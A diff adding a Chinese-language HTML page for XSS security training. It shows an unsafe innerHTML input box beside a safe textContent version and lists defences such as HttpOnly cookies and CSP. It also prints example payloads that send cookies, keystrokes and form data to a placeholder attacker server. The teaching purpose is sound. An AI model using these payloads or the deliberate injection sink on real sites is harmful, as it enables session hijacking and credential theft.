@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <title>XSS 安全演示</title>
+    <style>
+        .demo-section { margin: 20px; padding: 20px; border: 1px solid #ccc; }
+        .warning { color: red; }
+    </style>
+</head>
+<body>
+    <h1>XSS 攻击演示（仅用于安全培训）</h1>
+    
+    <div class="demo-section">
+        <h3>1. Cookie 窃取演示</h3>
+        <button onclick="showCookieDemo()">显示 Cookie</button>
+        <pre id="cookieOutput"></pre>
+    </div>
+
+    <div class="demo-section">
+        <h3>2. 用户输入演示</h3>
+        <input type="text" id="userInput" placeholder="输入内容">
+        <button onclick="displayUnsafe()">不安全显示</button>
+        <button onclick="displaySafe()">安全显示</button>
+        <div id="output"></div>
+    </div>
+
+    <script>
+        // 设置一些演示用的 cookie
+        document.cookie = "demoUserName=张三";
+        document.cookie = "demoEmail=zhangsan@example.com";
+        
+        // Cookie 窃取演示
+        function showCookieDemo() {
+            const cookies = document.cookie;
+            document.getElementById('cookieOutput').textContent = 
+                '当前 cookie 内容：' + cookies + '\n\n' +
+                '攻击者可能的代码：\n' +
+                'new Image().src = "http://攻击者服务器/steal?cookie=" + document.cookie;';
+        }
+
+        // 不安全的显示方式
+        function displayUnsafe() {
+            const input = document.getElementById('userInput').value;
+            document.getElementById('output').innerHTML = input;
+        }
+
+        // 安全的显示方式
+        function displaySafe() {
+            const input = document.getElementById('userInput').value;
+            document.getElementById('output').textContent = input;
+        }
+    </script>
+
+    <div class="demo-section">
+        <h3>常见攻击载荷示例：</h3>
+        <pre>
+1. 基础 XSS：
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+2. 图片标签 XSS：
+&lt;img src="x" onerror="fetch('http://攻击者服务器/steal?cookie='+document.cookie)"&gt;
+
+3. 键盘记录：
+&lt;script&gt;
+document.addEventListener('keypress', function(e) {
+    fetch('http://攻击者服务器/keys?k=' + e.key);
+});
+&lt;/script&gt;
+
+4. 表单劫持：
+&lt;script&gt;
+document.querySelector('form').addEventListener('submit', function(e) {
+    e.preventDefault();
+    fetch('http://攻击者服务器/form', {
+        method: 'POST',
+        body: new FormData(this)
+    });
+});
+&lt;/script&gt;
+        </pre>
+    </div>
+
+    <div class="demo-section">
+        <h3>防御措施：</h3>
+        <ul>
+            <li>使用 HttpOnly cookie</li>
+            <li>实施 CSP (Content Security Policy)</li>
+            <li>输入验证和消毒</li>
+            <li>使用 textContent 而不是 innerHTML</li>
+            <li>对用户输入进行转义</li>
+        </ul>
+    </div>
+</body>
+</html> 
